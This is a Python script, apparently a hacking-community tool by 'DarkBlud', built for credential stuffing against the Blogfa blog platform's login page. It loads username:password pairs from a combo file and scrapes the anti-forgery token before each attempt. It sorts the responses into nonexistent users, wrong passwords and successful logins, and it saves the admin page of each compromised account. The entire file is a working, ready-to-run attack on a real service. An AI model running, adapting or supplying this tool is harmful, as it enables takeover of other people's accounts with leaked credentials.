try:
    import os 
    import requests
    from colorama import Fore
    from bs4 import BeautifulSoup
except ModuleNotFoundError:
    print("Module not found installing libraries...\n")
    try:
        os.system("pip install bs4 colorama requests")
    except KeyError as e:
        print(f"Error : \n {e}")

print(f"""{Fore.BLUE}
     __        _   _   ___ _            _  __   _   _       ___ __  
 )_)  )   / ) / _  )_ /_)    __    / ` )_) /_) / ` )_/  )_  )_) 
/__) (__ (_/ (__/ (  / /          (_. / \ / / (_. /  ) (__ / \  
                         BY      DarkBlud                               
""")

url = "https://www.blogfa.com/desktop/login.aspx"
headers = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua": "\"Opera\";v=\"109\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "Referer": "https://www.blogfa.com/desktop/login.aspx",
    "Referrer-Policy": "strict-origin-when-cross-origin"
}

try:
    combo_choice = input(f"{Fore.CYAN}1- Use your custom combo file \n2- Use default combo file \n : ")
    if combo_choice == '1':
        path = input(f"{Fore.LIGHTCYAN_EX}Enter your combo file path \n : ")
        print(f"{Fore.GREEN} Starting...")
    elif combo_choice == '2':
        print(f"{Fore.GREEN} Starting...")
        path = "combo.txt"
    else:
        print(f"{Fore.RED}Invalid choice, exiting...")
        exit(1)

    with open(path, "r", encoding="utf-8") as file:
        lines = file.readlines()

    if lines:
        for line in lines:
            ttr_get = requests.get(url, headers=headers).text
            _tt = BeautifulSoup(ttr_get, "html.parser").find('input', {'name': '_tt'}).get('value')

            user, password = line.strip().split(":")
            data = {
                "_tt": _tt,
                "usrid": user,
                "ups": password,
                "btnSubmit": "ورود به بخش مدیریت وبلاگ"
            }

            response = requests.post(url, headers=headers, data=data)

            if "خطا: نام کاربری وجود ندارد، ممکن است آنرا درست وارد نکرده باشید" in response.text:
                print(f"{Fore.RED}Username ({user}) does not exist")
            elif "کلمه عبور را اشتباه وارد کرده اید" in response.text:
                print(f"{Fore.RED}Incorrect password for ({user})")
            elif "خروج از بخش مدیریت" in response.text:
                with open(f"{user}_index.html", "w", encoding="utf-8") as file:
                    file.write(response.text)
                print(f"{Fore.GREEN}Login successful for ({user})")
            elif "نام کاربری را اشتباه وارد کرده اید" in response.text:
                print(f"{Fore.RED}Username is not correct : ({user})")
            else:
                print(f"{Fore.RED}Unknown response for ({user}) \n maybe banned! ")
    else:
        print(f"{Fore.RED}There is no data in combo.txt")

except FileNotFoundError:
    print(f"{Fore.RED}File does not exist: {path}")
except KeyError as e:
    print(f"{Fore.RED}Couldn't read the data, Error: \n {e}")
